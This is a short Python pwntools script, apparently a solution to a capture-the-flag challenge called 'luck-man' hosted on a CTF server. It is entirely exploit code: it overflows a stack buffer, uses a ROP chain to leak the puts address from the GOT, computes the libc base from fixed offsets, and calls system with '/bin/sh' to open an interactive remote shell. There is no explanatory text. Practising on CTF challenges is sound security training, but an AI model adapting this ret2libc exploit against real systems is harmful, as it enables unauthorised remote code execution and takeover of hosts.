from pwn import *
#context(log_level='debug')
elf=ELF('./luck-man')
test2=0x40084D
pop_rdi=0x400973
pop_ret=0x4005ee

while 1:
 p=remote('pwn.challenge.ctf.show',28148)
 p.sendline(b'\x00')
 re=p.recv()
 if b'U are not the lucky man' in re:
  print('ok')
  break
 else:
  p.close()
  continue
 
payload=b'a'*(0x30+8)+p64(pop_rdi)+p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])+p64(test2)
p.sendline(payload)
puts_addr=u64(p.recvuntil('\n')[:-1].ljust(8,b'\x00'))
print(hex(puts_addr))

system=0x04f440
binsh=0x1b3e9a
puts=0x0809c0
base=puts_addr-puts
system+=base
binsh+=base

payload2=b'a'*(0x30+8)+p64(pop_rdi)+p64(binsh)+p64(pop_ret)
payload2+=p64(system)
p.sendline(payload2)
p.interactive()
